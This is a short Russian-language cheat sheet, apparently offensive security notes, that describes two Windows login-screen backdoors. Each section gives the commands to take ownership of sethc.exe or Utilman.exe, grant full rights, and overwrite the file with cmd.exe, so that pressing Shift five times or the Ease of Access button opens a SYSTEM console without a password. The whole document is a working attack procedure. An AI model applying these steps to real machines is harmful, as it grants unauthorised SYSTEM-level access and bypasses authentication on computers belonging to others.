#### Sticky Keys ####
# Можно получить доступ к командной строке с правами SYSTEM до входа в систему, даже если ты не знаешь пароля.
# В Windows есть функция «Залипание клавиш» (Sticky Keys), которая активируется после 5 нажатий Shift.
# При активации запускается программа C:\Windows\System32\sethc.exe.
# Если подменить этот файл на cmd.exe, то вместо залипания клавиш откроется командная строка.
# Важно: это можно сделать даже с экрана входа в систему — до ввода пароля.

## 1. Становимся владельцем файла и дает текущему пользователю прав модифицировать файл.
takeown /f c:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
## 2. Подменял исполняемый файл
copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
## 3. После этого делаем Lock сессии или авторизуемся заного и на окне ввода пароля нажимаем shift 5 раз. Получаем  консоль, запущенную от System.


#### Utilman ####
# Используется для доступа к параметрам на экране блокировки
# Когда мы кликаем на кнопку ease of access запускается исполняемый файл C:\Windows\System32\Utilman.exe
# Мы можем подменить его на cmd.exe и получить доступ к терминалу без авторизации.

## 1. Становимся владельцем файла и дает текущему пользователю прав модифицировать файл.
takeown /f c:\Windows\System32\utilman.exe
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
## 2. Подменяем исполняемый файл 
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
## 3. Блокируем экран и нажимаем кнопку ease of access и получаем терминал от system
